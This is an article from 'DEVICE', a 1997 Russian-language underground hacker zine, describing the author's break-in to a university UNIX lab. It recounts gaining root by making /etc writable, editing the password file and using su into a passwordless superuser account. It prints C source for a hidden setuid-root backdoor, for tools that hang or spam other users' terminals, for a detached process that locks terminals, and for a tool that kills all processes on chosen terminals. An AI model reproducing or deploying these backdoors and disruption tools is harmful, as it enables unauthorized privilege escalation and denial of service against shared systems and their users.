
       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ Copyright (c) 1997, by DRuG  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
       █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█ ████████████ ████▄▀███████▄  █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
       █ "TOP Device" - █ ████████████ ██████ ███████▄ █ ▀▀▄ █ █▀█ ▀▀█  █
       █  Underground   █    ██████ ▄▄▄██  ███ ██  ██▀ █  ▄▀   █▄█  ▄█▄ █
       █ Hackers 'Zine! █    ██████ █████████ ██████▀  █ █▄▄   ▄▄█   █  █
       █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█    ██████ ███████▀▄█████     █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ D   E   V   I   C   E ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                            Issue 2. December 1997.


                             ЧТО Я ЗНАЮ О UNIX'Е.

        Очень много документаций существует по взлому UNIX'а, поэтому я не
     буду  их цетировать, а расскажу то, что я сам и мои друзья откопали в
     ней. ЗАМЕЧАНИЕ:
        Приведённые  примеры программ написаны мною для системы UNIX AT&T,
     работающей в локальной сети.


                           1. Глюки устроенные нами.

        Имея  низкий  уровень  доступа и огромное желание что-нить сделать
     этакое,  мы  стали  усердно штурмовать систему. После нескольких дней
     штурма,  мы  нашли  файл, использующийся в данной системе для запуска
     языка  Pascal,  нашей  радости  небыло  предела,  т.к  этот  файл был
     доступен  нам  не  только  для чтения и запуска, но и для записи. Это
     позволяло нам иметь абсолютный доступ ко всем студенческим каталогам.
     И чтобы  как-то заявить о себе мы  по глупости вставили  в этот  файл
     свою заставочку, после чего злая Admin закрыла его для записи и  нае-
     хала на того человека, под именем которого мы работали.
        Мы  опять  были  у  разбитого  карыта,  но  тут  один  из нас, под
     впечатлением   книги  Дюна,  написал  игрушку,  которая  использовала
     внешний   файл   данных.  Может  быть  по  моей  глупости  или проcто
     проведению,  возьми  и  стукни  мне в голову сделать этот файл данных
     запускаемым  и запустить его. Результат был на лицо. Система повисла,
     перезапуск  был  возможен  только  при  отключения питания системы. И
     надо  же мне было  нажать клавишу ENTER  как раз в  тот момент, когда
     один из  пользователей  менял свой пароль. Система повисла, но в силу
     того что  файл Passwd.dat был открыт, после  перезапуска системы  его
     размер был равен  0. Admin'ша была  просто  в  ярости, не долго думаю
     она переустановила UNIX заново. В результате чего в системе образова-
     лись новые дырочки.
        Оказалось, что корневой каталог небыл защищон от записи, в отличие
     от всех остальных. Это дало нам возможность директории /etc поставить
     rwx,  тоесть  возможность  писать  в этот каталок, такимже макаром мы
     добрались  до  нашей  цели passwd.dat, через пару минут приоритет нам
     был  дан.  Мало того, появилась возможность пользоваться командой su,
     быстрая  смена  пользователя. Но у Root'а был пароль, подбор которого
     проходил бы очень долго, но в системе был ещё 1 пользователь, имевший
     права суперюзера, это powerdown. Этим логином пользовались лаборантки
     для  выключения  машин,  мало  того,  на  нём не стоял пароль, имелся
     только  .profile  (аналог autoexec.bat) в котором происходила провека
     на термнил, с которого идёт обращения, если это не console, он просто
     перезапускал  данный терминал. Но использую su, профайл незапускался,
     что  позволяло  получать  уровень  суперюзера.  (после  захода  таким
     образом  необходимо  набрать sh, т.к при перходе включился коммандный
     процессор  rsh,  а он неможит полноценно работать на пользовательских
     терминалах.)
        Поняв, что у нас это единственный шанс, и "власть" надо удержать в
     своих  руках,  я  сделал  просую  программку,  которая  делает  права
     суперпользователя так сказать из воздуха.

#include<stdio.h>
#include<string.h>

main()
{
 if (strcmp(getpass("Password: "),"мой пароль")==0)
 {
  setuid(0);
  setgid(0);
  system("dgc");//dgc - аналог нортона
 }
 else
  printf("Error #276");
}

        После  компиляции  этой  программы  необходимо было сделать только
     chmod 4555 <имя файла> и запрятать этот файл подальше и чтобы их было
     побольше.  Идея  оправдала  себя, и после того как у когото потёрлась
     семестровая,  и  всё  свалили  на нас, пришла Admin'ша и потёрла наши
     директории вместе с правами, мы смогли легко восстановиться.
        После   этого   жить   стало   скушновато  и  пришлось  раскравать
     возможности  этой  системы и писать под неё программки. Вот программа
     написанная  мною,  которая позволяет пользователю возможность достать
     другого или других пользователей ;).

#include<stdio.h>
#include<string.h>
main(a,b)
int a;
char **b;
{
 FILE *f;
 char c[50],s[255],l;
 int i,o;
 if (a==1)
 {
  printf("send <terminal1 .. terminaln>\n\n");
  exit();
 }
 printf("Enter your message (? - help, q - quit). \n");
 while (1)
 {
  printf(": ");
  gets(s);
  if (s[0]=='q')
  {
   printf("\nOk.\n");
   exit();
  }
  if (s[0]=='?')
  {
   printf("Макро-ключи: \\1 - зависание.\n");
   printf("             \\2 - звуковой сигнал.\n");
   printf("             \\3 - очистка экрана.\n");
   printf("             \\4 - развешивание.\n");
   printf("             \\5 - новая кодировка.\n");
   printf("             \\6 - старая кодировка.\n");
   printf("             \\7 - отмена всех аттрибутов.\n");
   printf("             \\8 - мерцание.\n");
   printf("             \\9 - повышенная яркость.\n");
   printf("             \\0 - инверсия.\n");
   printf("             \\- - подчеркивание.\n");
   printf("             \\n - перевод строки.\n");
   printf("             \\h - Left Corner.\n");
  }
  else
  {
   for (i=1;i<a;i++)
   {
    strcpy(c,"/dev/");
    strcat(c,b[i]);
    f=fopen(c,"w");
    for (o=0;o<strlen(s);o++)
    {
     l=s[o];
     if (l=='\\')
     {
      o++;
      l=s[o];
      if (l=='h')
       fprintf(f,"\33[0;0H");
      if (l=='-')
       fprintf(f,"\33[44m");
      if (l=='0')
       fprintf(f,"\33[7m");
      if (l=='9')
       fprintf(f,"\33[1m");
      if (l=='1')
       fprintf(f,"\23");
      if (l=='2')
       fprintf(f,"\7");
      if (l=='3')
       fprintf(f,"\33[2J\33[0;0H");
      if (l=='4')
       fprintf(f,"\21");
      if (l=='5')
       fprintf(f,"\16");
      if (l=='6')
       fprintf(f,"\17");
      if (l=='7')
       fprintf(f,"\33[0m");
      if (l=='8')
       fprintf(f,"\33[5m");
      if (l=='n')
       fprintf(f,"\r\n");
     }
     else
      fprintf(f,"%c",s[o]);
    }
    fclose(f);
   }
  }
 }
}

        При  запуске  в  параметрах фала указываются терминалы, которые вы
     хотите заглючить.
        Меня очень бесил наглый первый курс, который заходил в аудиторию и
     с  высокомерной  фразой  "пиннал" нас с машин. На зло им я сделал эту
     программу,   которая   по   истечении  определённого  времени  вешает
     терминал, и не только тот, на котором была запущеная программа. После
     запуска,  программа  начинает  существовать  как  фоновый процесс, не
     принадлежащий  некакому  терминалу,  из-за  чего процессы такого типа
     работают даже при выхода "злоумышленника" из системы.

#include<conio.h>
#include<stdio.h>
main(a,b)
int a;
char **b;
{
 int s,i;
 char c;
 if (a==1)
  {
   printf("Error. updown <minutes>\n");
   exit();
  }
 setpgrp(0); // создаю несуществующую группу процессов
 i=fork();   // создаю потомка, тчную копию предка
 if (i!=0)
  exit(0);   // убиваю предка и потомок неоткого не зависит.;)
 s=atoi(b[1]);
 delay(2000*s);
 while (1)
  printf("\23"); // при полылании этого символа на экран, у терминала
                 // виснет клавиатура...это отлючается программно.
 endwin();
}

        Терминалы   имели   нехорошую   причуду,   они  частенько  висли и
     приходилось   вручнуюубивать   все   процессы   принадлежавшие  этому
     терминалу,  что  было  неудобно. Поэтому я сделал программу Killterm,
     которая уничтожала процелссы на данном терминале, но она оказалось не
     идеальной  и  поэтому  я  сделал  совершенно  новую, которая работала
     безотказно, а очень часто применялась не по назначению...;)

#include<stdio.h>
main(a,b)
int a;
char **b;
{
 int i,p;
 char s[100],pid[7],tty[7],time[7],com[50],c;
 FILE *f;
 if (a==1)
 {
  printf("Error: killps <terminal1..terminaln>.\n");
  exit();
 }
 nice(-39);
 for (i=1;i<a;i++)
 {
  strcpy(s,"ps -t ");
  strcat(s,b[i]);
  strcat(s," > kill.dat");
  system(s);
  f=fopen("kill.dat","a");
  fprintf(f,"- - - -");
  fclose(f);
  f=fopen("kill.dat","r");
  while (pid[0]!='-')
  {
   fscanf(f,"%s %s %s %s\n",pid,tty,time,com);
   if (pid[0]!='-')
   {
    p=atoi(pid);
    if (p!=0)
     kill(p,9);
   }
  }
  fclose(f);
  pid[0]='\0';
 }
 printf("Ok.\n");
 system("rm -rf kill.dat");
}

        Прграмма выполняется при -39 приоритете, что позволяет ей работать
     значительно быстрее других процессов.
        Следующая  программа  была  написанна  мною  "во  времена  великой
     дипрессии",  когда  мене  белать  было  нечего,  а  когда мене делать
     нечего,  я  начинаю  делать  разные  пакасти.  И  данная программа не
     является   исключением.  По  экрану  терминала  (  немоего;))  летают
     точечки,  этот процесс фоновый, непринадлежащий неодному терминалу, а
     по сему отследить злоумышленника невозможно.

#include<signal.h>
#include<conio.h>
#define N 5
main()
{
 int x[N],y[N],sx[N],sy[N],xx[N],yy[N],i;
 setpgrp(0);
 i=fork();
 if (i!=0)
  exit();
 setattr(0);
 setattr(1);
 for (i=0;i<N;i++)
 {
  x[i]=rand(79);
  y[i]=rand(24);
  sx[i]=rand(2);
  if (sx[i]==0)
   sx[i]=-1;
  sy[i]=rand(2);
  if (sy[i]==0)
   sy[i]=-1;
 }
 while (1)
 {
  for (i=0;i<N;i++)
  {
   xx[i]=x[i];
   yy[i]=y[i];
   gotoxy(xx[i],yy[i]);
   printf(" ");
   x[i]=x[i]+sx[i];
   y[i]=y[i]+sy[i];
   if (x[i]>78||x[i]<1)
   {
    sx[i]=-sx[i];
   }
   if (y[i]>23||y[i]<1)
   {
    sy[i]=-sy[i];
   }
   gotoxy(x[i],y[i]);
   printf(".");
  }
 }
}

        Я  даже  дал  ей  имя  Mat.c так как кроме мата, после её запуска,
     нечего другого нельзя было узлышать.
        После  этого меня потянуло на всячекие извращения и изощрения, и я
     написал   программу,  которая  позволяла  мене  со  смоего  терминала
     запускить  программу,  которая всё отображала на другом терминале, но
     клавиши опрашивала с моего терминала.

#include<curses.h>
#include<string.h>
main(a,b)
int a;
char **b;
{
 char c,s[100];
 if (a<=2)
 {
  printf("Error: execute.exe <terminal> <program>\n");
  exit();
 }
 initscr();
 noecho();
 cbreak();
 nodelay(stdscr,TRUE);
 strcpy(s,"tee|");
 strcat(s,b[2]);
 strcat(s,">/dev/");
 strcat(s,b[1]);
 system(s);
}

        Я  знаю, что некоторые возразят по поводу этой программы, и скажут
     что  можно былобы не извращаться так..и не писать отдельную программы
     на C, а просто в коммандной строку написать:
     program > /dev/ttyXX
     но я им возражу, т.к. в этом случае ваша клавиатура будет опрашивать-
     ся, но  анализироваться нажатия быдыт только после нажатия Enter'а.

        В  данный  момент  я  уже забросил какую либо деательность на этих
     машинах  и  предаставляю  вам малую часть программ, которые я написал
     под Unix.

                                                         Саша из Казани...


